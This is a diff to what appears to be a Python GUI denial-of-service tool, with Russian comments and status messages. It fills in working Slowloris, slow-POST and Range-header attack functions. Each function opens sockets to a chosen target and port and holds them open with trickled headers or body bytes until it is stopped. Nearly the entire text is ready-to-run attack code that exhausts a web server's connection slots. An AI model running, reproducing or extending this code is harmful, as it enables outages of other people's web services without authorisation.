@@ -88,23 +88,80 @@ def slowloris_ui(parent_frame, go_back_callback=None):
     # text_box.place(relx=0.5, rely=0.85, anchor="center")
 
 # Функции для атак
-def slowloris_attack(sock, target):
-    sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
-    sock.send(f"Host: {target}\r\n".encode())
-    sock.send("User-Agent: slowloris-test\r\n".encode())
-    sock.send("Content-Length: 10000\r\n".encode())
+# Реализация атаки Slowloris
+def slowloris_socket(target, port, interval, stop_event, text_box):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4)
+        s.connect((target, port))
+        update_text_box(text_box, f"[+] Подключено к {target}:{port}")
 
-def slowpost_attack(sock, target):
-    sock.send(f"POST / HTTP/1.1\r\n".encode())
-    sock.send(f"Host: {target}\r\n".encode())
-    sock.send("User-Agent: slowpost-test\r\n".encode())
-    sock.send("Content-Length: 10000\r\n\r\n".encode())
+        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
+        s.send(f"Host: {target}\r\n".encode())
+        s.send("User-Agent: slowloris-test\r\n".encode())
+        s.send("Content-Length: 10000\r\n".encode())
 
-def range_attack(sock, target):
-    sock.send(f"GET / HTTP/1.1\r\n".encode())
-    sock.send(f"Host: {target}\r\n".encode())
-    sock.send("User-Agent: range-test\r\n".encode())
-    sock.send("Range: bytes=0-0\r\n\r\n".encode())
+        while not stop_event.is_set():
+            try:
+                s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
+                update_text_box(text_box, "[~] Заголовок отправлен...")
+                time.sleep(interval)
+            except socket.error as e:
+                update_text_box(text_box, f"[!] Ошибка сокета: {e}")
+                break
+    except Exception as e:
+        update_text_box(text_box, f"[!] Ошибка подключения: {e}")
+    finally:
+        s.close()
+        update_text_box(text_box, "[*] Соединение закрыто")
+
+# Реализация атаки Slowpost
+def slowpost_socket(target, port, interval, stop_event, text_box):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4)
+        s.connect((target, port))
+        update_text_box(text_box, f"[+] Подключено к {target}:{port}")
+
+        s.send(f"POST / HTTP/1.1\r\n".encode())
+        s.send(f"Host: {target}\r\n".encode())
+        s.send("User-Agent: slowpost-test\r\n".encode())
+        s.send("Content-Length: 10000\r\n\r\n".encode())
+
+        while not stop_event.is_set():
+            s.send(f"{random.randint(1,9)}".encode())
+            update_text_box(text_box, "[~] Отправка тела запроса...")
+            time.sleep(interval)
+
+    except Exception as e:
+        update_text_box(text_box, f"[!] Ошибка: {e}")
+    finally:
+        s.close()
+        update_text_box(text_box, "[*] Соединение закрыто")
+
+# Реализация атаки Range
+def range_socket(target, port, interval, stop_event, text_box):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4)
+        s.connect((target, port))
+        update_text_box(text_box, f"[+] Подключено к {target}:{port}")
+
+        s.send(f"GET / HTTP/1.1\r\n".encode())
+        s.send(f"Host: {target}\r\n".encode())
+        s.send("User-Agent: range-test\r\n".encode())
+        s.send("Range: bytes=0-0\r\n\r\n".encode())
+
+        while not stop_event.is_set():
+            s.send(f"X-range: keep\r\n".encode())
+            update_text_box(text_box, "[~] Range-запрос продолжается...")
+            time.sleep(interval)
+
+    except Exception as e:
+        update_text_box(text_box, f"[!] Ошибка: {e}")
+    finally:
+        s.close()
+        update_text_box(text_box, "[*] Соединение закрыто")
 
 # Запуск атаки с выбранным методом
 def start_attack(target, port, sockets, interval, parent_frame, attack_method):
